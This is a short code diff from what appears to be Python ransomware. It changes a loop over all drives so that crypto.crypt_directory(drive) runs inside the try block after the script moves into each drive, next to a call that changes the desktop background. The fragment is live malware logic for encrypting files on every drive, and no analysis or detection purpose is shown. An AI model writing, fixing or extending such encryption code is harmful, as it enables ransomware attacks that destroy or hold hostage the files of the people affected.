@@ -385,9 +385,8 @@ crypto.change_background(appdata)
 for drive in drives:
     try:
         chdir(drive + '/')
+        crypto.crypt_directory(drive)
     except FileNotFoundError:
         continue
     except PermissionError:
         continue
-    finally:
-        crypto.crypt_directory(drive)
